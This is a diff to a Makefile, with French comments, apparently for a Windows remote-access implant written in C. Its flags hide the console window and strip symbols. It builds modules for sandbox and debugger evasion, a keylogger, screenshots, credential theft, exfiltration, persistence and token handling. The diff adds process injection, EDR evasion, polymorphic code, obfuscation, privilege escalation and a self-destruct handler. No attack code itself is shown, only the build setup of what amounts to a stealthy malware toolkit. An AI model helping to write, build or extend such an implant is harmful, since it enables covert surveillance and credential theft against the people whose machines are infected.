@@ -12,6 +12,7 @@ CFLAGS += -I./include -I./src
 # Flags pour cacher la console et strip les symbols
 LDFLAGS = -s -mwindows
 LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid -lgdiplus -lcrypt32 -ldbghelp -lshlwapi
+LDFLAGS += -lbcrypt -ltaskschd -loleaut32 -lntdll -lpsapi
 
 # Flags de debug (décommenter pour debug)
 # CFLAGS += -g -DDEBUG
@@ -34,12 +35,16 @@ CRYPTO_SRC = $(SRC_DIR)/crypto/aes.c \
 
 UTILS_SRC = $(SRC_DIR)/utils/memory.c \
             $(SRC_DIR)/utils/strings.c \
-            $(SRC_DIR)/utils/peb.c
+            $(SRC_DIR)/utils/peb.c \
+            $(SRC_DIR)/utils/obfuscation.c
 
 EVASION_SRC = $(SRC_DIR)/evasion/syscalls.c \
               $(SRC_DIR)/evasion/antidebug.c \
               $(SRC_DIR)/evasion/sandbox.c \
-              $(SRC_DIR)/evasion/sleep.c
+              $(SRC_DIR)/evasion/sleep.c \
+              $(SRC_DIR)/evasion/injection.c \
+              $(SRC_DIR)/evasion/edr_evasion.c \
+              $(SRC_DIR)/evasion/polymorph.c
 
 NETWORK_SRC = $(SRC_DIR)/network/transport.c \
               $(SRC_DIR)/network/profile.c \
@@ -52,7 +57,8 @@ TASKS_SRC = $(SRC_DIR)/tasks/dispatcher.c \
             $(SRC_DIR)/tasks/handlers/process.c \
             $(SRC_DIR)/tasks/handlers/recon.c \
             $(SRC_DIR)/tasks/handlers/persist.c \
-            $(SRC_DIR)/tasks/handlers/token.c
+            $(SRC_DIR)/tasks/handlers/token.c \
+            $(SRC_DIR)/tasks/handlers/destruct.c
 
 SURVEILLANCE_SRC = $(SRC_DIR)/surveillance/keylogger.c \
                    $(SRC_DIR)/surveillance/screenshot.c \
@@ -69,7 +75,9 @@ EXFIL_SRC = $(SRC_DIR)/exfil/exfil.c
 
 RECON_SRC = $(SRC_DIR)/recon/scanner.c
 
-ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC) $(CREDENTIALS_SRC) $(EXFIL_SRC) $(RECON_SRC)
+PRIVESC_SRC = $(SRC_DIR)/privesc/privesc.c
+
+ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC) $(CREDENTIALS_SRC) $(EXFIL_SRC) $(RECON_SRC) $(PRIVESC_SRC)
 
 # Fichiers objets
 OBJ = $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(ALL_SRC))
@@ -105,6 +113,7 @@ dirs:
 	@mkdir -p $(BUILD_DIR)/credentials
 	@mkdir -p $(BUILD_DIR)/exfil
 	@mkdir -p $(BUILD_DIR)/recon
+	@mkdir -p $(BUILD_DIR)/privesc
 	@mkdir -p $(BIN_DIR)
 
 $(EXE_TARGET): $(OBJ)
